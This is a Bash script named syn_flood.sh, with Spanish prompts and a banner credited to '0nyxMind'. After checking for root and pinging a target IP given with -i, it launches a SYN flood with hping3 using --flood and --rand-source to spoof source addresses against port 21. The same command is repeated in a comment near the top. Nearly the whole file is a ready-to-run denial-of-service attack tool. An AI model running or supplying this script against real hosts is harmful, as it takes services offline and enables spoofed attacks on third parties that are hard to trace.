#!/bin/bash 

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

# hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source 10.10.10.10

function ctrl_c(){
	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Saliendo...${endColour}\n"
	exit 1
}



if [[ $EUID -ne 0 ]]; then
  echo -e "\n${redColour}[!]${endColour}${redColour} Debes ser root para ejecutar esta herramienta.${endColour}${lightRed} (sudo ./syn_flood.sh)${endColour}"
  exit 1
fi

function banner(){

  echo -e "\n███████╗██╗   ██╗███╗   ██╗████████╗██╗  ██╗"
  echo "██╔════╝╚██╗ ██╔╝████╗  ██║╚══██╔══╝██║ ██╔╝"
  echo "███████╗ ╚████╔╝ ██╔██╗ ██║   ██║   █████╔╝ "
  echo "╚════██║  ╚██╔╝  ██║╚██╗██║   ██║   ██╔═██╗ "
  echo "███████║   ██║   ██║ ╚████║   ██║   ██║  ██╗"
  echo "╚══════╝   ╚═╝   ╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝"
  echo -e "\t\tBy: ${purpleColour}0nyxMind${endColour}"  

}

function attack(){
  ipAddress="$1"
  echo -e "\n"
  hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source $ipAddress
}



function checker(){
  ipAddress="$1"
  
  timeout 1 bash -c "ping -c 1 $ipAddress" &>/dev/null
  status=$?
  if [ $status -eq 0 ]; then
    echo -e "\n${yellowColour}[+]${endColour}${grayColour} Atacando la dirección IP${endColour} - ${purpleColour}$ipAddress${endColour}"
    attack $ipAddress
  else
    echo -e "\n${redColour}[!]${endColour}${grayColour} No hay conexión con la dirección IP${endColour} - ${purpleColour}$ipAddress${endColour}\n"
    exit 1  
  fi
}

trap ctrl_c INT

function helpPanel(){
  echo -e "\n${yellowColour}[+]${endColour}${grayColour} Uso:${endColour}"
  echo -e "\t${purpleColour}i)${endColour}${grayColour} Dirección IP a atacar${endColour}"
}


# Indicadores
declare -i parameter_counter=0 

while getopts "i:h" arg; do
  case $arg in
    i) ipAddress="$OPTARG"; let parameter_counter+=1;; 
    h) ;;
  esac
done

if [ $parameter_counter -eq 1 ]; then
  banner
  checker $ipAddress
else 
  banner
  helpPanel
fi
